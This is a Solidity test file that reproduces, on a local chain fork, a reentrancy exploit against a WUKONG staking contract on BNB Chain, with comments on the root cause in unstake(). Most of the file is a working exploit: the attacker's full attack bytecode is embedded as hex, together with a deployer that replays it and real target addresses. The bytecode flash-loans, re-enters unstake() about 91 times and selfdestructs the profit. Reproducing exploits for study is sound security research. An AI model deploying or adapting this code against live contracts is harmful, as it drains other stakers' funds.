// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";

// @KeyInfo - Total Lost : ~57.68 BNB (~$37.7K)
// Attacker        : 0x13be1ae7c8413cc95f3566e9393c618d29965ac8
// Attack Contract : 0xddb8fd9441242b25f401096536d6ef83afa9101f (CREATE in the attack tx)
// Vulnerable      : 0x07d398c888c353565cf549bbee3446791a49f285 (Staking proxy, EIP-1967)
// Implementation  : 0xd828e972b7fc9ad4e6c29628a760386a94cfdeda (StakingUpgradeableV10)
// Staking token   : 0xdd540a1e727fe562a63b4d7925f229e4e693cc0e (WUKONG / WkToken)
// WBNB/WUKONG LP  : 0x7219e1a1e14c3f7e52db43a4a2db21d30957e080 (Pancake LP)
// FlashLoan source: 0x58f876857a02d6762e0101bb5c46a8c1ed44dc16 (Pancake WBNB/BUSD pair)
// Attack Tx       : https://bscscan.com/tx/0x79467533d4d1f332df846dc78c16fe319cd1d3a1a0f01545b4cdd7a2d3a71d22
// Second Tx       : https://bscscan.com/tx/0x97e2b875552e4e82d058a775c7dd14198d15df869260235dbaf6577e5e3b13cc (~$18K)
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xd828e972b7fc9ad4e6c29628a760386a94cfdeda#code
//
// @Analysis
// Root cause (StakingUpgradeableV10.unstake()):
//   unstake() returns BNB to the caller with
//       (bool success,) = payable(msg.sender).call{value: bnbReceived}("");
//   and only AFTERWARDS closes the position:
//       stakeInfoList[index].isStaking = false;   // ... .amount = 0; .lpAmount = 0;
//   There is NO reentrancy guard and checks-effects-interactions is violated. When the
//   caller is a contract, its receive() re-enters unstake() while hasStaked() is still
//   true and stakeInfoList[index].lpAmount still holds the full LP amount. removeLiquidityETH
//   is therefore called again with the SAME LP amount, repeatedly pulling LP that belongs to
//   OTHER stakers out of the contract and paying the attacker BNB on every iteration.
//
// Attack path (atomic, one CREATE tx):
//   flash-loan WBNB from the Pancake WBNB/BUSD pair -> unwrap to BNB -> stake() once to open a
//   position -> unstake() which re-enters ~91 times, each time removing more pooled LP -> repay
//   the flash loan -> selfdestruct forwards the drained BNB to the attacker EOA.
//
// PoC strategy: REPLAY the historical CREATE initcode from the attacker EOA at block-1. The
// initcode is self-funding (Pancake flash swap) and forwards profit to its creator via
// selfdestruct, so no value/manual funding is needed. The attacker's re-entry loop is
// gasleft()-bounded, so we deploy with the real transaction's gas limit (23,898,015) to
// reproduce the real ~91 iterations / ~57 BNB rather than the loop's 150-iteration hard cap.

interface IStaking {
    function isOpen() external view returns (bool);
    function totalStakeLpAmount() external view returns (uint256);
    function totalStakeAmount() external view returns (uint256);
}

// Deploys the historical attacker initcode. The re-entry loop inside the initcode is
// gasleft()-bounded, so the CALLER caps the gas via {gas: cap} to reproduce the real ~91
// iterations. The selfdestruct-returned BNB profit lands in this contract; sweep() (a fresh
// full-gas call) then forwards it to the attacker EOA. Splitting deploy/sweep avoids the
// capped call running out of gas while forwarding.
contract ReplayDeployer {
    function run(bytes memory code) external returns (address deployed) {
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
    }

    function sweep(address to) external {
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {}
}

contract WUKONGStaking_exp is BaseTestWithBalanceLog {
    address constant ATTACKER = 0x13Be1Ae7C8413cC95f3566e9393c618D29965Ac8;
    address constant STAKING  = 0x07D398c888c353565CF549bBeE3446791a49F285;

    uint256 constant ATTACK_BLOCK   = 86_047_027;
    uint256 constant FORK_BLOCK     = ATTACK_BLOCK - 1;
    // Real transaction gas limit (bounds the attacker's gasleft()-limited re-entry loop).
    uint256 constant REAL_TX_GAS    = 23_898_015;

    bytes constant ATTACK_INITCODE =
        hex"60806040525f604051610011906101a9565b604051809103905ff08015801561"
        hex"002a573d5f803e3d5ffd5b5090508073ffffffffffffffffffffffffffffffff"
        hex"ffffffff1663c04062266040518163ffffffff1660e01b81526004015f604051"
        hex"808303815f87803b158015610072575f80fd5b505af1158015610084573d5f80"
        hex"3e3d5ffd5b505050505f604051610095906101a9565b604051809103905ff080"
        hex"1580156100ae573d5f803e3d5ffd5b5090508073ffffffffffffffffffffffff"
        hex"ffffffffffffffff1663c04062266040518163ffffffff1660e01b8152600401"
        hex"5f604051808303815f87803b1580156100f6575f80fd5b505af1158015610108"
        hex"573d5f803e3d5ffd5b505050505f604051610119906101a9565b604051809103"
        hex"905ff080158015610132573d5f803e3d5ffd5b5090508073ffffffffffffffff"
        hex"ffffffffffffffffffffffff1663c04062266040518163ffffffff1660e01b81"
        hex"526004015f604051808303815f87803b15801561017a575f80fd5b505af11580"
        hex"1561018c573d5f803e3d5ffd5b505050503373ffffffffffffffffffffffffff"
        hex"ffffffffffffff16ff5b610bd8806101b78339019056fe60a060405234801561"
        hex"000f575f80fd5b503373ffffffffffffffffffffffffffffffffffffffff1660"
        hex"808173ffffffffffffffffffffffffffffffffffffffff168152505060805161"
        hex"0b756100635f395f81816104e001526105190152610b755ff3fe608060405260"
        hex"04361061002c575f3560e01c8063848008121461016c578063c0406226146101"
        hex"9457610168565b366101685760015f9054906101000a900460ff16801561004d"
        hex"575060965f54105b15610166577307d398c888c353565cf549bbee3446791a49"
        hex"f28573ffffffffffffffffffffffffffffffffffffffff1663c93c8f34306040"
        hex"518263ffffffff1660e01b815260040161009f91906106c5565b602060405180"
        hex"830381865afa1580156100ba573d5f803e3d5ffd5b505050506040513d601f19"
        hex"601f820116820180604052508101906100de919061071b565b15610165575f80"
        hex"8154809291906100f49061077c565b91905055507307d398c888c353565cf549"
        hex"bbee3446791a49f28573ffffffffffffffffffffffffffffffffffffffff1663"
        hex"2def66206040518163ffffffff1660e01b81526004015f604051808303815f87"
        hex"803b158015610152575f80fd5b505af1925050508015610163575060015b505b"
        hex"5b005b5f80fd5b348015610177575f80fd5b5061019260048036038101906101"
        hex"8d9190610878565b6101aa565b005b34801561019f575f80fd5b506101a86105"
        hex"17565b005b7358f876857a02d6762e0101bb5c46a8c1ed44dc1673ffffffffff"
        hex"ffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffff"
        hex"ffffffffffff16146101f5575f80fd5b73bb4cdb9cbd36b01bd1cbaebf2de08d"
        hex"9173bc095c73ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d"
        hex"671be4f459be8900006040518263ffffffff1660e01b815260040161024a9190"
        hex"61090b565b5f604051808303815f87803b158015610261575f80fd5b505af115"
        hex"8015610273573d5f803e3d5ffd5b505050507307d398c888c353565cf549bbee"
        hex"3446791a49f28573ffffffffffffffffffffffffffffffffffffffff16633a4b"
        hex"66f1671bc16d674ec800006040518263ffffffff1660e01b81526004015f6040"
        hex"51808303818588803b1580156102d9575f80fd5b505af11580156102eb573d5f"
        hex"803e3d5ffd5b50505050506001805f6101000a81548160ff0219169083151502"
        hex"179055505f80819055507307d398c888c353565cf549bbee3446791a49f28573"
        hex"ffffffffffffffffffffffffffffffffffffffff16632def66206040518163ff"
        hex"ffffff1660e01b81526004015f604051808303815f87803b158015610368575f"
        hex"80fd5b505af115801561037a573d5f803e3d5ffd5b505050505f60015f610100"
        hex"0a81548160ff0219169083151502179055505f60016126f7612710671be4f459"
        hex"be8900006103b39190610924565b6103bd9190610992565b6103c791906109c2"
        hex"565b905073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c73ffffffffffff"
        hex"ffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660"
        hex"e01b81526004015f604051808303818588803b158015610423575f80fd5b505a"
        hex"f1158015610435573d5f803e3d5ffd5b505050505073bb4cdb9cbd36b01bd1cb"
        hex"aebf2de08d9173bc095c73ffffffffffffffffffffffffffffffffffffffff16"
        hex"63a9059cbb7358f876857a02d6762e0101bb5c46a8c1ed44dc16836040518363"
        hex"ffffffff1660e01b815260040161049d9291906109f5565b6020604051808303"
        hex"815f875af11580156104b9573d5f803e3d5ffd5b505050506040513d601f1960"
        hex"1f820116820180604052508101906104dd919061071b565b507f000000000000"
        hex"000000000000000000000000000000000000000000000000000073ffffffffff"
        hex"ffffffffffffffffffffffffffffff16ff5b7f00000000000000000000000000"
        hex"0000000000000000000000000000000000000073ffffffffffffffffffffffff"
        hex"ffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16"
        hex"1461056e575f80fd5b671bc16d674ec800007307d398c888c353565cf549bbee"
        hex"3446791a49f28573ffffffffffffffffffffffffffffffffffffffff16639440"
        hex"9a566040518163ffffffff1660e01b8152600401602060405180830381865afa"
        hex"1580156105d4573d5f803e3d5ffd5b505050506040513d601f19601f82011682"
        hex"0180604052508101906105f89190610a30565b10610684577358f876857a02d6"
        hex"762e0101bb5c46a8c1ed44dc1673ffffffffffffffffffffffffffffffffffff"
        hex"ffff1663022c0d9f671be4f459be8900005f306040518463ffffffff1660e01b"
        hex"815260040161065693929190610af7565b5f604051808303815f87803b158015"
        hex"61066d575f80fd5b505af115801561067f573d5f803e3d5ffd5b505050505b56"
        hex"5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b"
        hex"5f6106af82610686565b9050919050565b6106bf816106a5565b82525050565b"
        hex"5f6020820190506106d85f8301846106b6565b92915050565b5f80fd5b5f80fd"
        hex"5b5f8115159050919050565b6106fa816106e6565b8114610704575f80fd5b50"
        hex"565b5f81519050610715816106f1565b92915050565b5f602082840312156107"
        hex"305761072f6106de565b5b5f61073d84828501610707565b9150509291505056"
        hex"5b7f4e487b710000000000000000000000000000000000000000000000000000"
        hex"00005f52601160045260245ffd5b5f819050919050565b5f6107868261077356"
        hex"5b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        hex"ffffffff82036107b8576107b7610746565b5b600182019050919050565b6107"
        hex"cc816106a5565b81146107d6575f80fd5b50565b5f813590506107e7816107c3"
        hex"565b92915050565b6107f681610773565b8114610800575f80fd5b50565b5f81"
        hex"359050610811816107ed565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f80"
        hex"83601f84011261083857610837610817565b5b8235905067ffffffffffffffff"
        hex"8111156108555761085461081b565b5b60208301915083600182028301111561"
        hex"08715761087061081f565b5b9250929050565b5f805f805f6080868803121561"
        hex"0891576108906106de565b5b5f61089e888289016107d9565b95505060206108"
        hex"af88828901610803565b94505060406108c088828901610803565b9350506060"
        hex"86013567ffffffffffffffff8111156108e1576108e06106e2565b5b6108ed88"
        hex"828901610823565b92509250509295509295909350565b61090581610773565b"
        hex"82525050565b5f60208201905061091e5f8301846108fc565b92915050565b5f"
        hex"61092e82610773565b915061093983610773565b925082820261094781610773"
        hex"565b9150828204841483151761095e5761095d610746565b5b5092915050565b"
        hex"7f4e487b71000000000000000000000000000000000000000000000000000000"
        hex"005f52601260045260245ffd5b5f61099c82610773565b91506109a783610773"
        hex"565b9250826109b7576109b6610965565b5b828204905092915050565b5f6109"
        hex"cc82610773565b91506109d783610773565b92508282019050808211156109ef"
        hex"576109ee610746565b5b92915050565b5f604082019050610a085f8301856106"
        hex"b6565b610a1560208301846108fc565b9392505050565b5f81519050610a2a81"
        hex"6107ed565b92915050565b5f60208284031215610a4557610a446106de565b5b"
        hex"5f610a5284828501610a1c565b91505092915050565b5f819050919050565b5f"
        hex"819050919050565b5f610a87610a82610a7d84610a5b565b610a64565b610773"
        hex"565b9050919050565b610a9781610a6d565b82525050565b5f82825260208201"
        hex"905092915050565b7f0100000000000000000000000000000000000000000000"
        hex"0000000000000000005f82015250565b5f610ae1600183610a9d565b9150610a"
        hex"ec82610aad565b602082019050919050565b5f608082019050610b0a5f830186"
        hex"6108fc565b610b176020830185610a8e565b610b2460408301846106b6565b81"
        hex"81036060830152610b3581610ad5565b905094935050505056fea26469706673"
        hex"58221220e3c61538f135af0ab99c8c998cb190bfed90bb6e4edc1bded5aeaa50"
        hex"af900c9364736f6c63430008140033";

    function setUp() public {
        vm.createSelectFork("http://127.0.0.1:8546", FORK_BLOCK);
        fundingToken = address(0); // profit measured in native BNB
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        require(IStaking(STAKING).isOpen(), "staking not open");

        ReplayDeployer dep = new ReplayDeployer();
        bytes memory code = ATTACK_INITCODE;

        vm.prank(ATTACKER, ATTACKER);
        address deployed = dep.run{gas: REAL_TX_GAS}(code);
        require(deployed != address(0), "CREATE failed");

        // Forward the drained BNB from the deployer to the attacker EOA (fresh full-gas call).
        dep.sweep(ATTACKER);

        uint256 profit = ATTACKER.balance;
        emit log_named_decimal_uint("Attacker BNB profit", profit, 18);
        // Real attack netted ~57.68 BNB to the EOA; assert a strong lower bound.
        assertGt(profit, 50 ether, "reentrancy did not reproduce expected profit");
    }
}
